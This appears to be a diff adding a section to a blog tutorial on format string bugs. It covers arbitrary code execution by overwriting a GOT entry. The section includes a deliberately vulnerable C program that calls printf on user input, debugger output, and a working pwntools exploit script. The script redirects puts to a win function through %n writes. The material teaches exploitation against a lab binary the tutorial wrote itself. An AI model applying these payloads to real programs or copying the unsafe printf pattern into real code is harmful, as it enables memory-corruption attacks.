@@ -305,12 +305,81 @@ p.interactive()
 <img src='https://github.com/0xSh4dy/0xSh4dy.github.io/blob/master/assets/img/fmtstr/fmtstr_06.png?raw=true'>
 
 
-Awesome, isn't it?
+Awesome, isn't it? Let's try some more interesting stuff such as arbitrary code execution.
+
+<hr/>
+
+### Arbitrary Code Execution using format strings
+The easiest way to achieve arbitrary code execution via format strings is GOT overwrite.
+
+#### GOT Overwrite
+Let's write a simple program vulnerable to format string bug. Global Offset Table is a table of pointers that point to a library function. In simple words, it holds the addresses of functions that are dynamically linked. Calling a library function will eventually call the function pointer stored at that function's GOT entry.
+
+```c
+#include<stdio.h>
+#include<string.h>
 
 
+void win(){
+	puts("You win");
+}
 
+void func(){
+	char buf[80];
+	puts("How are you?");
+	scanf("%80s",buf);
+	printf(buf);
+}
 
+int main(){
+	int choice;
+	puts("Hi there!");
+	func();
+	puts("Sayonara");
+	return 0;
+}
+```
+<img src='https://github.com/0xSh4dy/0xSh4dy.github.io/blob/master/assets/img/fmtstr/fmtstr_07.png?raw=true'>
+```
+➜  formatStrings ./chall 
+Hi there!
+How are you?
+aaaaaaaa.%6$p   
+aaaaaaaa.0x6161616161616161Sayonara
+```
+It means that the starting offset for our input is 6. In case of `No RELRO` or `Partial RELRO`, we can overwrite the Global Offset Table entry of puts with the address of `win`(0x4011b6).
+```
+pwndbg> got
 
+GOT protection: Partial RELRO | GOT functions: 4
+ 
+[0x404018] puts@GLIBC_2.2.5 -> 0x7ffff7e44420 (puts) ◂— endbr64 
+
+```
+Our goal is to write 0x4011b6 at 0x404018. 
+
+```py
+#!/usr/bin/env python3
+
+from pwn import *
+elf = context.binary = ELF("./chall")
+
+p = elf.process()
+
+puts_got = 0x404018
+win = 0x4011b6
+
+payload = b''
+payload += b'aaaaaaa%57c%10$n'
+payload += b'aaaa%4466c%11$hn'
+
+payload += p64(puts_got+2)
+payload += p64(puts_got)
+
+p.sendline(payload)
+p.interactive()
+```
+<img src='https://github.com/0xSh4dy/0xSh4dy.github.io/blob/master/assets/img/fmtstr/fmtstr_08.png?raw=true'>
 References:
 <br>
 
